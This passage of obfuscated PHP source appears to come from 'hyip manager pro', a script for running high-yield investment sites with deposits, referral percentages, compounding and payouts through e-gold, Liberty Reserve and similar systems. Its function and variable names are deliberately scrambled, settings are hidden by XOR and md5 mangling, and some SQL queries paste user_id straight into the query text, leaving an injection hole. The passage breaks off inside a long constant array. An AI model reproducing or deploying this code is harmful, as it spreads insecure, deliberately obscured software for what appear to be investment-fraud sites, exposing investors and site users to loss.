    $elnlcHIABx = md5 ($elnlcgpbje . $elnlcoFEhc);
    $elnlcoFEhc = $elnlcgpbje . ':' . $elnlcHIABx . ':' . $elnlcoFEhc;
    $elnlcoFEhc .= chr (1) . chr (1) . chr (1);
    $elnlcIUUJq = strlen ($elnlcoFEhc) + 121;
    $elnlcpltP = rand (1, 100000000000) % $elnlcIUUJq;
    $elnlclWgwF = array ();
    $d = array ();
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < $elnlcIUUJq; ++$i)
    {
      $d[$i] = -1;
      $elnlclWgwF[$i] = -1;
    }

    $elnlcpltP = elnlcqomiu (0, $elnlcIUUJq, $d);
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($elnlcoFEhc); ++$i)
    {
      $elnlcpltP = elnlcqomiu ($elnlcpltP, $elnlcIUUJq, $d);
      $d[$elnlcpltP] = substr ($elnlcoFEhc, $i, 1);
    }

    for ($i = $elnlcsyENS['elnlcmjUx']; $i < $elnlcIUUJq; ++$i)
    {
      if ($d[$i] == -1)
      {
        $d[$i] = chr (rand (1, 253));
        continue;
      }
    }

    $elnlcRIwA = fopen ($elnlcsyENS['elnlcolOSW'], $elnlcsyENS['elnlcFobeq']);
    $r = array ();
    fputs ($elnlcRIwA, '<?
');
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < $elnlcIUUJq; ++$i)
    {
      fputs ($elnlcRIwA, sprintf ('%02x', ord ($d[$i]) ^ 65));
    }

    fputs ($elnlcRIwA, '
?>');
    fclose ($elnlcRIwA);
  }

  function elnlcsncwj ()
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if (!is_writeable ('settings.php'))
    {
      print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>settings.php</b> file!<br>';
      exit ();
    }

    if (file_exists ('tmpl_c/.htdata'))
    {
      if (!is_writeable ('tmpl_c/.htdata'))
      {
        print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>tmpl_c/.htdata</b> file!<br>';
        exit ();
      }
    }

    $elnlcMITL = $elnlcsyENS['elnlcmjUx'];
    if (file_exists ('tmpl_c/.htdata'))
    {
      $elnlcMITL = $elnlcsyENS['elnlctNxTK'];
    }

    $elnlcRIwA = fopen ($elnlcsyENS['elnlcHFtK'], $elnlcsyENS['elnlcFobeq']);
    reset ($elnlcSuVc);
    fputs ($elnlcRIwA, '<?/*
');
    $elnlcTCRD = '';
    while (list ($elnlcuwppG, $elnlcOBJb) = each ($elnlcSuVc))
    {
      if ($elnlcuwppG != 'logged')
      {
        if (($elnlcMITL == 0 OR ($elnlcMITL == 1 AND preg_match ('/^key/', $elnlcuwppG))))
        {
          if (!preg_match ('/_generated/', $elnlcuwppG))
          {
            fputs ($elnlcRIwA, (('' . $elnlcuwppG . '	') . $elnlcOBJb . '
'));
            $elnlcTCRD .= (('' . $elnlcuwppG . '	') . $elnlcOBJb . '
');
          }
        }

        $elnlcTCRD .= (('' . $elnlcuwppG . '	') . $elnlcOBJb . '
');
        continue;
      }
    }

    $elnlcTCRD = elnlcrioy ($elnlcTCRD, $elnlcSuVc[$elnlcsyENS['elnlcgmuy']]);
    $elnlcGhNCz = $elnlcsyENS['elnlcmjUx'];
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($elnlcTCRD); $i += 5)
    {
      $elnlcGhNCz += hexdec (substr ($elnlcTCRD, $i, 5));
    }

    $elnlcGhNCz = $elnlcGhNCz * 15;
    fputs ($elnlcRIwA, ('' . 'cnf	' . $elnlcGhNCz . '
'));
    fputs ($elnlcRIwA, '*/?>
');
    fclose ($elnlcRIwA);
    if ($elnlcMITL == 1)
    {
      $elnlcRIwA = fopen ($elnlcsyENS['elnlchAAhB'], $elnlcsyENS['elnlcFobeq']);
      fputs ($elnlcRIwA, $elnlcTCRD);
      fclose ($elnlcRIwA);
    }

  }

  function elnlcflii ($q, $w, $a)
  {
    global $elnlcsyENS;
    if ($a != 'RedControl 2010')
    {
      return elnlcrioy ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcsyENS['elnlcmjUx'];
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcgglf ($q, $w, $a)
  {
    global $elnlcsyENS;
    if ($a != 'RedControl 2010')
    {
      return elnlcsajtj ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcsyENS['elnlcmjUx'];
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcrioy ($q, $w)
  {
    global $elnlcsyENS;
    $l = strtoupper (md5 ($w));
    $j = $elnlcsyENS['elnlcmjUx'];
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcsajtj ($q, $w)
  {
    global $elnlcsyENS;
    $l = strtoupper (md5 ($w));
    $j = $elnlcsyENS['elnlcmjUx'];
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcrplov ()
  {
    global $elnlcsyENS;
    if (!($elnlcUazB = mysql_connect ($elnlcSuVc[$elnlcsyENS['elnlcxSzvm']], $elnlcSuVc[$elnlcsyENS['elnlcIrMu']], $elnlcSuVc[$elnlcsyENS['elnlcJwCJT']])))
    {
      exit (mysql_error ());
      (bool)true;
    }

    if (!mysql_select_db ($elnlcSuVc[$elnlcsyENS['elnlcRjMcF']]))
    {
      print mysql_error ();
      exit ();
    }

    return $elnlcUazB;
  }

  function elnlcmlcr ($elnlcCDID = 0)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    $l = elnlcgglf ($elnlcSuVc[$elnlcsyENS['elnlcIrMu']], $elnlcSuVc[$elnlcsyENS['elnlcgmuy']], $elnlcsyENS['elnlcWfUti']);
    $p = elnlcgglf ($elnlcSuVc[$elnlcsyENS['elnlcJwCJT']], $elnlcSuVc[$elnlcsyENS['elnlcgmuy']], $elnlcsyENS['elnlcWfUti']);
    $elnlcrtLw = elnlcgglf ($elnlcSuVc[$elnlcsyENS['elnlcRjMcF']], $elnlcSuVc[$elnlcsyENS['elnlcgmuy']], $elnlcsyENS['elnlcWfUti']);
    if ($elnlcCDID == 1)
    {
      $elnlcUazB = @mysql_connect ($elnlcSuVc[$elnlcsyENS['elnlcxSzvm']], $l, $p);
      if ($elnlcUazB)
      {
        if (!mysql_select_db ($elnlcrtLw))
        {
          $elnlcUazB = $elnlcsyENS['elnlcmjUx'];
        }
      }
    }
    else
    {
      if (!($elnlcUazB = mysql_connect ($elnlcSuVc[$elnlcsyENS['elnlcxSzvm']], $l, $p)))
      {
        exit (mysql_error ());
        (bool)true;
      }

      if (!mysql_select_db ($elnlcrtLw))
      {
        print mysql_error ();
        exit ();
      }
    }

    return $elnlcUazB;
  }

  function elnlcnooln ($elnlcUazB)
  {
    global $elnlcsyENS;
    mysql_close ($elnlcUazB);
  }

  function zelnlcnczen ($elnlcEabU)
  {
    global $elnlcsyENS;
    $elnlcEabU = htmlspecialchars ($elnlcEabU, ENT_QUOTES);
    $elnlcEabU = str_replace ('\\', '\\\\', $elnlcEabU);
    $elnlcEabU = str_replace ('\'', '\\\'', $elnlcEabU);
    return $elnlcEabU;
  }

  function elnlcnczen ($elnlcEabU)
  {
    $elnlcEabU = str_replace ('\'', '\'\'', $elnlcEabU);
    $elnlcEabU = str_replace ('\\', '\\\\', $elnlcEabU);
    return $elnlcEabU;
  }

  function elnlcshwnc ($elnlcAlyux, $elnlckWnb = 1)
  {
    global $elnlcsyENS;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', $elnlcsyENS['elnlcKOJo']);
    if ($elnlckWnb == 2)
    {
      $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', $elnlcsyENS['elnlczhyK']);
    }

    $i = $elnlcsyENS['elnlcmjUx'];
    $elnlcEabU = '';
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < $elnlcAlyux; ++$i)
    {
      $elnlcEabU .= $a[rand (0, sizeof ($a) - 1)];
    }

    if ($elnlckWnb == 1)
    {
      $elnlcEabU = md5 ($elnlcEabU);
    }

    return $elnlcEabU;
  }

  function elnlcpfqe ($elnlcAlyux)
  {
    global $elnlcsyENS;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'A', 'B', 'C', 'D', 'E', 'F');
    $i = $elnlcsyENS['elnlcmjUx'];
    $elnlcEabU = '';
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < $elnlcAlyux; ++$i)
    {
      $elnlcEabU .= $a[rand (0, sizeof ($a) - 1)];
    }

    return $elnlcEabU;
  }

  function elnlcmext ($elnlckapu)
  {
    global $elnlcsyENS;
    $q = '' . 'select type, sum(actual_amount) as sum from hm2_history where user_id = ' . $elnlckapu . ' group by type';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    $elnlcLOJT = array ();
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcLOJT[$elnlcCgqPK[$elnlcsyENS['elnlcsMIe']]] = $elnlcCgqPK[$elnlcsyENS['elnlcHSGM']];
    }

    $elnlcfWPmm = $elnlcsyENS['elnlcmjUx'];
    while (list ($elnlcuwppG, $elnlcOBJb) = each ($elnlcLOJT))
    {
      $elnlcfWPmm += $elnlcOBJb;
    }

    $elnlcLOJT[$elnlcsyENS['elnlceleT']] = $elnlcfWPmm;
    $q = '' . 'select sum(actual_amount) as sum from hm2_deposits where user_id = ' . $elnlckapu . ' and status=\'on\'';
    ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $elnlcLOJT[$elnlcsyENS['elnlcHcDrx']] += $elnlcCgqPK[$elnlcsyENS['elnlcHSGM']];
    }

    return $elnlcLOJT;
  }

  function elnlcurhn ($elnlcnKlC, $elnlchbnJ = false)
  {
    global $elnlcsyENS;
    $elnlcMowk = '';
    if ((is_string ($elnlcnKlC) AND $elnlcnKlC !== ''))
    {
      $elnlcTdLz = intval ($elnlcnKlC);
      if (strval ($elnlcTdLz) === $elnlcnKlC)
      {
        $elnlcnKlC = $elnlcTdLz;
      }
      else
      {
        $elnlcgbmK = floatval ($elnlcnKlC);
        if (strval ($elnlcgbmK) === $elnlcnKlC)
        {
          $elnlcnKlC = $elnlcgbmK;
        }
      }
    }

    if (is_array ($elnlcnKlC))
    {
      reset ($elnlcnKlC);
      $elnlcFuvdM = true;
      $i = $elnlcsyENS['elnlcmjUx'];
      foreach ($elnlcnKlC as $elnlcxHGyw => $elnlciaLH)
      {
        if ((!is_int ($elnlcxHGyw) OR $elnlcxHGyw != $i))
        {
          $elnlcFuvdM = false;
          break;
        }

        ++$i;
      }

      $elnlchzdn = ($elnlcFuvdM ? '[' : '{');
      $elnlcMowk .= $elnlchzdn;
      $elnlcLJJw = true;
      reset ($elnlcnKlC);
      foreach ($elnlcnKlC as $elnlcxHGyw => $elnlciaLH)
      {
        if (!$elnlcLJJw)
        {
          $elnlcMowk .= ',';
        }

        if (!$elnlcFuvdM)
        {
          $elnlcMowk .= $elnlcxHGyw . ':';
        }

        $elnlcMowk .= elnlcurhn ($elnlciaLH, $elnlchbnJ);
        $elnlcLJJw = false;
      }

      $elnlchzdn = ($elnlcFuvdM ? ']' : '}');
      $elnlcMowk .= $elnlchzdn;
    }
    else
    {
      if (is_string ($elnlcnKlC))
      {
        $elnlcKaTW = array ('\\', '\'', '
', '
');
        $elnlcwemGQ = array ('\\\\', '\\\'', '\\n', '\\r');
        if ($elnlchbnJ)
        {
          $elnlcKaTW[] = '<';
          $elnlcwemGQ[] = '<\'+\'';
        }

        $elnlcIVqny = str_replace ($elnlcKaTW, $elnlcwemGQ, $elnlcnKlC);
        $elnlchzdn = '\'' . $elnlcIVqny . '\'';
        $elnlcMowk .= $elnlchzdn;
      }
      else
      {
        if (is_bool ($elnlcnKlC))
        {
          $elnlchzdn = ($elnlcnKlC ? 'true' : $elnlcsyENS['elnlcaqjyf']);
          $elnlcMowk .= $elnlchzdn;
        }
        else
        {
          if (is_null ($elnlcnKlC))
          {
            $elnlchzdn = 'null';
            $elnlcMowk .= $elnlchzdn;
          }
          else
          {
            $elnlchzdn = $elnlcnKlC;
            $elnlcMowk .= $elnlchzdn;
          }
        }
      }
    }

    return $elnlcMowk;
  }

  function elnlcbphmz ($elnlcNFSm)
  {
    global $elnlcsyENS;
    $elnlcMowk = '';
    foreach ($elnlcNFSm as $elnlcxHGyw => $elnlcrkADN)
    {
      if ($elnlcMowk !== '')
      {
        $elnlcMowk .= ', ';
      }

      if (substr ($elnlcrkADN, 0, 5) == 'now()')
      {
        $elnlcMowk .= '' . $elnlcxHGyw . ' = ' . $elnlcrkADN;
        continue;
      }
      else
      {
        $elnlcMowk .= '' . $elnlcxHGyw . ' = \'' . elnlcnczen ($elnlcrkADN) . '\'';
        continue;
      }
    }

    if ($elnlcMowk != '')
    {
      $elnlcMowk = ' ' . $elnlcMowk . ' ';
    }

    return $elnlcMowk;
  }

  function elnlcdvqmd ($elnlcOBJb)
  {
    global $elnlcsyENS;
    if ($elnlcRTuQ == ini_get ('magic_quotes_gpc'))
    {
      $elnlcOBJb = str_replace ('\\\'', '\'', $elnlcOBJb);
      $elnlcOBJb = str_replace ('\\"', '"', $elnlcOBJb);
      $elnlcOBJb = str_replace ('\\\\', '\\', $elnlcOBJb);
    }

    $elnlcOBJb = strip_tags ($elnlcOBJb);
    $elnlcOBJb = trim ($elnlcOBJb);
    return $elnlcOBJb;
  }

  function elnlcgvxbj ($i, $j)
  {
    return sprintf ('%.6f', $i);
  }

  function elnlcxupkr (&$elnlcsDUbN, $elnlcUtSzD = 0)
  {
    global $elnlcsyENS;
    reset ($elnlcsDUbN);
    foreach ($elnlcsDUbN as $k => $v)
    {
      $elnlcjGGx = array ();
      if (is_array ($v))
      {
        elnlcxupkr ($elnlcsDUbN[$k], $elnlcUtSzD);
        continue;
      }
      else
      {
        $elnlcjGGx = elnlctunqo ($v);
        $elnlcsDUbN[$k] = $elnlcjGGx[$elnlcUtSzD];
        continue;
      }
    }

  }

  function elnlctunqo ($elnlcOBJb)
  {
    global $elnlcsyENS;
    global $elnlcefEVM;
    if ($elnlcefEVM == 1)
    {
      $elnlcOBJb = str_replace ('\\\'', '\'', $elnlcOBJb);
      $elnlcOBJb = str_replace ('\\"', '"', $elnlcOBJb);
      $elnlcOBJb = str_replace ('\\\\', '\\', $elnlcOBJb);
    }

    $elnlcRHkP = $elnlcOBJb;
    $elnlcOBJb = strip_tags ($elnlcOBJb);
    $elnlcOBJb = trim ($elnlcOBJb);
    return array ($elnlcOBJb, $elnlcRHkP);
  }

  $elnlcsyENS = array ('elnlcCaCK' => 'activate.tpl', 'elnlczhyK' => '0', 'elnlcxSzvm' => 'hostname', 'elnlcmDVSw' => 'AKKD47LYX8H96K2TM2FQ', 'elnlctnrsW' => 'deposits_exeeded.tpl', 'elnlcNweHp' => 'selected', 'elnlcPDkB' => 'use_ip_for_auto', 'elnlcHyhOp' => 'last10', 'elnlcKOleR' => 'top10', 'elnlcEctmv' => 'validation_enabled', 'elnlcmMPnR' => 'ref_percent1', 'elnlcbiim' => 'show_info_box_last_update', 'elnlcfsTJ' => 'gpg_path', 'elnlcCsKL' => 'transaction_code_too_small', 'elnlcJPKy' => 'PMT_AMOUNT', 'elnlcEbpr' => '4AQF57S8UFCC3WR443RD', 'elnlcRwBLi' => 'calendar', 'elnlcnzflb' => 'LMI_SYS_INVS_NO', 'elnlcevKUa' => 'action', 'elnlcCPjuf' => 'egc_timestamp', 'elnlcrgPR' => 'edit_account.tpl', 'elnlcBDKLP' => 'withdraw', 'elnlcpUTK' => 'edit_account_confirmation.tpl', 'elnlcNRWtf' => 'wappassword', 'elnlcAgBxj' => 'file5', 'elnlcSzzCf' => 'h_id', 'elnlcVhdta' => 'deposit.remitfund.confirm.tpl', 'elnlcnLzG' => 'solidtrustpay_postback', 'elnlcdBhdK' => 'pending_col', 'elnlcBChWl' => 'V1_HASH', 'elnlclGhTo' => '1', 'elnlcldmTL' => 'deposit_fee_min', 'elnlcnMClm' => 'referal.links.tpl', 'elnlcARBzD' => 'too_small_amount', 'elnlcUwoD' => 'trans_code_recovery.tpl', 'elnlcfNibu' => 'ok', 'elnlcRdzs' => 'checkpayment_evowallet', 'elnlciSEu' => 'vip_users_deposit_amount', 'elnlcGARVG' => 'pay_withdraw', 'elnlcUGHaR' => 'withdraw', 'elnlcfuHxt' => 'use_history_balance_mode', 'elnlcPfbm' => 'TIMESTAMP', 'elnlcsyCOL' => 'HTTP_CACHE_CONTROL', 'elnlcmjdk' => 'name', 'elnlcnGMB' => 'REMOTE_ADDR', 'elnlcTpetz' => 'ssl_url', 'elnlcvAMt' => 'total_earned', 'elnlcJaus' => 'show_info_box_total_accounts', 'elnlcdktEr' => 'email', 'elnlcnxfxo' => 'sess_password', 'elnlcMNAm' => 'show_info_box_today_withdraw_funds', 'elnlckcxCi' => 'hyip manager pro 2005 jul 26', 'elnlckUUEh' => 'enter_pin', 'elnlctDSvC' => 'ip', 'elnlcGftJp' => 'sponser', 'elnlcNKfTR' => 'ok11', 'elnlchGbPt' => 'burl', 'elnlcLdgMF' => 'escape', 'elnlctqde' => '155', 'elnlcqViz' => 'eb_metal', 'elnlcRBjUy' => '__debug_out', 'elnlcezdi' => 'deposit.eurogoldcash.confirm.tpl', 'elnlcsodeQ' => 'evowallet_from_account', 'elnlcECzCn' => 'referals.tpl', 'elnlcIQlnV' => 'Q9LT6D46U96R96RD9KUF', 'elnlcsEqy' => 'redirect_to_https', 'elnlcCipNH' => 'turing_image', 'elnlcAglxS' => 'bf_counter', 'elnlcfigFf' => 'news.tpl', 'elnlcIEsb' => 'site_name', 'elnlcKOJo' => 'z', 'elnlczTyE' => 'Hourly', 'elnlcfaVLO' => 'rp_custom1', 'elnlcJLxB' => 'referals', 'elnlcddJpj' => '31', 'elnlcwKFVp' => 'daily_referral_percent', 'elnlcfQNGT' => 'hold', 'elnlczbMtS' => 'rp_batch', 'elnlcSWBK' => 'transaction_id', 'elnlclPzi' => 'y', 'elnlctgvUa' => 'tw', 'elnlcaqCts' => 'store_uncrypted_password', 'elnlcFoGP' => 'total_withdraw', 'elnlcnlxV' => 'deposit.altergold.confirm.tpl', 'elnlcqlfn' => 'total_users', 'elnlccSjM' => 'min_auto_withdraw', 'elnlcAIMpf' => 'transaction_code', 'elnlcDEsC' => 'country', 'elnlcEEvEB' => 'username_exists', 'elnlcfWmaV' => 'lr_transfer', 'elnlcKAtV' => 'can_withdraw', 'elnlcefEa' => 'deposit.pecunix.confirm.tpl', 'elnlcpyGW' => 'md5altphrase_webmoney', 'elnlcoOOJ' => 'egc_store', 'elnlcEaup' => 'periodsum', 'elnlcKbeJa' => 'deposit.evowallet.confirm.tpl', 'elnlchfpb' => '9999', 'elnlcWukD' => 'deletewappass', 'elnlcNSjp' => 'bf_compound', 'elnlcBoPWD' => 'ZXMCQ227FNN5EPHWYHAY', 'elnlcDKKOL' => 'startup_bonus_ec', 'elnlcLbvLL' => 'id', 'elnlckbju' => 'compound_forbidden', 'elnlcszjoh' => 'add_funds', 'elnlcjCSJ' => 'free', 'elnlcRfuvo' => 'max', 'elnlcrLdHj' => 'deposit_date', 'elnlcUvsh' => 'sq', 'elnlcitBa' => 'advanced_graph_validation_max_font_size', 'elnlcenLp' => 'step2', 'elnlcMSQOx' => 'should_count', 'elnlcTAvcf' => 'payerAccount', 'elnlcVIzRs' => 'calendar.tpl', 'elnlcFAsh' => 'SELLERACCOUNTID', 'elnlcWITk' => 'deposit.alertpay.confirm.tpl', 'elnlctoPxw' => 'invite_sent', 'elnlcFumnc' => 'hyip4free', 'elnlcsgzTh' => 'day_from', 'elnlcTBIJb' => 'from', 'elnlcULrED' => 'deposit', 'elnlcwcAe' => 'agree', 'elnlcvAnU' => 'show_news_always', 'elnlcxiLbw' => 'show_banner', 'elnlcVzbc' => 'JC23K75XNK88X2JQZSTK', 'elnlclLKg' => 'follow_id', 'elnlcAoFu' => 'RETURNCODE', 'elnlcPGeV' => 'testmode', 'elnlchyWz' => 'rules', 'elnlcNCOOK' => 'complete', 'elnlcWIwpj' => 'euro', 'elnlcRcbc' => 'evowallet_apiname', 'elnlcEuerH' => '4ZQQN55VA2NXBVFUQJE6', 'elnlcwjJNu' => 'withdrawal_history.tpl', 'elnlcqiiQs' => 'enabled', 'elnlcVLuoO' => 'fields', 'elnlcBpGlU' => 'system_email', 'elnlcvbJj' => 'rp_acc_buyer', 'elnlcFxME' => 'to_small_amount', 'elnlcsNwx' => 'GET', 'elnlciVebs' => 'account_', 'elnlcvncu' => 'ok', 'elnlcrHmeD' => 'CUSTOM1', 'elnlcpniD' => 'file1', 'elnlceDOd' => 'routepay_withdraw', 'elnlcBnEG' => 'came_from', 'elnlcORJuw' => 'compound_min_percent', 'elnlcDNqHg' => '18', 'elnlcDRmH' => 'rateus', 'elnlcTrIn' => 'usercanchangeemail', 'elnlcJiab' => 'address', 'elnlcxAdnS' => 'PMT_VERIFY_HASH', 'elnlcusWcW' => 'save', 'elnlcJgHnx' => 'currency_from', 'elnlckzbl' => 'phpbb_register', 'elnlcPhAu' => 'finnish', 'elnlcPHDp' => 'remitfund_from_account', 'elnlcIMmgI' => 'faq', 'elnlcNVEl' => '2NWMXXCJS54ESRZYJ2AJ', 'elnlchqdMM' => 'withdraw_principal.tpl', 'elnlcdWyJ' => 'high', 'elnlcdgIz' => 'size', 'elnlcfuUWB' => 'auto_withdraw', 'elnlcEoNu' => 'accounts', 'elnlcmLGP' => 'pay_withdraw_alertpay', 'elnlcdrfg' => 'invalid_turing', 'elnlcKcCmd' => 'paying_batch', 'elnlcSqSW' => 'gdp_custom_1', 'elnlczFIo' => 'earning', 'elnlcxzsG' => 'LMI_PAYMENT_NO', 'elnlcisNwx' => 'min', 'elnlccIhHr' => '21', 'elnlczJFaO' => 'sfrom', 'elnlchlbQm' => 'USD', 'elnlclcgPq' => 'min_withdrawal_amount', 'elnlcToEDy' => 'fullname', 'elnlcsFPCe' => 'sess_email', 'elnlcmLNAt' => 'show_refs10_stats', 'elnlcIIuHu' => 'cust', 'elnlcnKDe' => '501', 'elnlcIAHdF' => 'confirmation_code', 'elnlcHrSi' => 'usercanchangeegoldacc', 'elnlceoerl' => 'moneyplus.biz/verify_account.tpl', 'elnlcwWABC' => 'user1', 'elnlcLQwSN' => 'ver', 'elnlcIrMu' => 'db_login', 'elnlcIRydS' => 'email', 'elnlcuNmr' => 'show_full_sum', 'elnlcLtrkH' => 'LMI_SYS_TRANS_DATE', 'elnlcvfyCI' => 'PHP_SELF', 'elnlcjWWW' => 'time_dif', 'elnlcCaWmo' => 'deposit.evocash.confirm.tpl', 'elnlcGPcC' => 'm', 'elnlcyFsxD' => 'hash', 'elnlcTeLjs' => 'lr_encrypted', 'elnlcNBsGo' => 'period2', 'elnlcOhvjC' => 'percent', 'elnlcIrOA' => 'min_amount', 'elnlcluWTj' => 'LMI_PAYER_PURSE', 'elnlcLvmm' => 'password2', 'elnlcxHPb' => 'show_info_box_newest_member_generated', 'elnlcgGGpv' => 'CameFrom', 'elnlcaJFAl' => 'exchange_out', 'elnlcANlw' => 'payee', 'elnlcpjhxj' => 'egold_withdraw_string', 'elnlcwrzip' => '/get_pid.php', 'elnlchSbkF' => 'egc_currency', 'elnlcrsPe' => 'action2', 'elnlcJGWIT' => 'solid_referral_commission_amount', 'elnlcdOjrc' => '__debug_data', 'elnlcuhEaA' => 'VSNANTNU4J9AYBU2MK6Z', 'elnlcMFyGk' => 'max_deposit', 'elnlcWTtP' => 'pay_account', 'elnlcBGGit' => '__SECURITY_SETTINGS', 'elnlcwWga' => 'exchange', 'elnlcAywNv' => 'site_start_day', 'elnlcfThgN' => '1007', 'elnlcDexfh' => 'compound_percents', 'elnlcODvc' => 'change', 'elnlcbqbpQ' => 'ebullion_keyID', 'elnlcnDyB' => 'hid', 'elnlcAlpp' => 'c', 'elnlchhoD' => 'activate', 'elnlcmIQk' => 'graph_bg_color', 'elnlcUSeG' => 'LMI_MODE', 'elnlcfPgDr' => 'advanced_graph_validation_min_font_size', 'elnlcUWFjd' => 'payee_email', 'elnlclURm' => 'use_html', 'elnlcrujF' => 'after_registration.tpl', 'elnlczdOP' => '3m', 'elnlcMWguV' => 'deposit.perfectmoney.confirm.tpl', 'elnlcWxHP' => 'P5PS3CZMGUQM22NSVHZ6', 'elnlcgigAt' => 'startup_bonus', 'elnlcIiRpl' => 'program_version', 'elnlcKwrP' => './tmpl_c/log.txt', 'elnlcidRjl' => 'moneyplus.biz/verified.tpl', 'elnlciIAFv' => '7', 'elnlcJtvsi' => 'reset', 'elnlcHJpI' => 'def_payee_account', 'elnlcnocCE' => 'FS3MJS85KVNLE98KG6PY', 'elnlcgjPm' => 'month_from', 'elnlcqoDp' => 'PGJyPgpMSUNFTlNFID0g
', 'elnlcDqRF' => 'signup2', 'elnlcWKqO' => 'LANG', 'elnlcUuADw' => 'angle', 'elnlcMknGz' => '100', 'elnlcvgzxW' => 's', 'elnlcHHvP' => 'error', 'elnlccVez' => 'members_stats', 'elnlcTbVBq' => 'estimate_earnings_for_end_of_day', 'elnlcmxdQs' => 'min_user_password_length', 'elnlcIpUx' => 'YmdHis', 'elnlcIjIc' => 'rp_custom2', 'elnlcklvup' => 'deposit.egold.status.tpl', 'elnlcirLe' => 'refs10', 'elnlczpJj' => 'bnum', 'elnlcnVDv' => 'account', 'elnlcHfyuR' => 'run_crontab', 'elnlcEcuR' => 'HTTPS', 'elnlcGxnUP' => 'session_name', 'elnlcRWMVC' => 'md5altphrase_eurogoldcash', 'elnlcKHell' => 'session_id', 'elnlcKrRIE' => 'c_all', 'elnlcHSUz' => 'day_to', 'elnlcHuNC' => 'PAYMENT_BATCH', 'elnlcDwzTf' => 'rateus.tpl', 'elnlcIrtRw' => 'license', 'elnlcpbpw' => 'value', 'elnlcOnrTm' => 'v', 'elnlcrvId' => 'EUR', 'elnlcpuuw' => 'ref_username', 'elnlcKFMO' => 'LMI_PAYMENT_AMOUNT', 'elnlcefiL' => 'date_register', 'elnlcnkDe' => 'rp_acc_merchant', 'elnlcRneL' => '15', 'elnlczVNbP' => 'register', 'elnlcUIjSg' => 'receiving_batch', 'elnlcRwKF' => 'info_box_total_active_accounts_generated', 'elnlczhcB' => 'show_info_box', 'elnlcvNkQ' => 'use_compound', 'elnlciEuo' => 'end', 'elnlcahbUH' => 'def_payee_account_vmoney', 'elnlcSsDzR' => 'withdraw_preview', 'elnlcNQaFf' => 'rp_amount', 'elnlcsKfy' => 'SG8JH9DVX8952VQEZH9F', 'elnlcOhgyp' => 'withdraw_principal_duration', 'elnlcOLaU' => 'file2', 'elnlcutzo' => '5MTHEA3YPUTD6CDJ9LSP', 'elnlcQEKp' => 'max_tries', 'elnlcOnMHn' => 'maxam', 'elnlcvWoa' => 'has_account', 'elnlcDktpQ' => 'show_info_box_last_update_generated', 'elnlcxULH' => 'max_amount', 'elnlcSqNhq' => 'pay_active_referal', 'elnlcKfPvd' => 'deposit.anonygold.confirm.tpl', 'elnlcAvUq' => 'user_id', 'elnlcGpVor' => 'ref_plans.tpl', 'elnlcfUNsT' => '85', 'elnlcJduI' => 'SGURWGFUWLQB75QDJHXU', 'elnlcojBh' => 'daily_referral_percent_min_downline_deposit', 'elnlcHxFT' => 'RHLFPPEURGQGG68GXYA8', 'elnlcgtrK' => 'AYKA2URL7PQLN5FUXHE5', 'elnlcMIrlF' => 'account_update_confirmation', 'elnlchGOqf' => '11', 'elnlcnkdI' => 'ver_string', 'elnlcjqIoL' => 'too_big_amount_plus_fee', 'elnlcOPUx' => 'USD', 'elnlcBLqC' => 'tell_friend.tpl', 'elnlcGFGW' => 'altergold_from_account', 'elnlcvpcb' => 'signup2/signup3.tpl', 'elnlcVBQbW' => 'egc_amnt', 'elnlcLfUAO' => 'use_referal_program', 'elnlcSUNo' => '17', 'elnlcoUax' => 'def_payee_account_eurogoldcash', 'elnlcVIBb' => 'withdrawal.tpl', 'elnlceTbc' => 'deposit.eeecurrency.confirm.tpl', 'elnlcdHUDm' => 'banner.tpl', 'elnlcnzWD' => 'add_funds.tpl', 'elnlcmTqF' => 'gdp_custom_3', 'elnlcWFcf' => 'return_egold', 'elnlcyteO' => 'amount', 'elnlcfBDgk' => 'html', 'elnlcAtarm' => 'user3', 'elnlcVLuu' => 'egold_from_account', 'elnlcxdwDv' => 'max_withdrawal_amount', 'elnlcxtMH' => 'force_upline', 'elnlccRVS' => 'confirm_registration', 'elnlcRjMcF' => 'database', 'elnlcIfbuA' => 'md5altphrase_globaldigitalpay_store', 'elnlczMrjv' 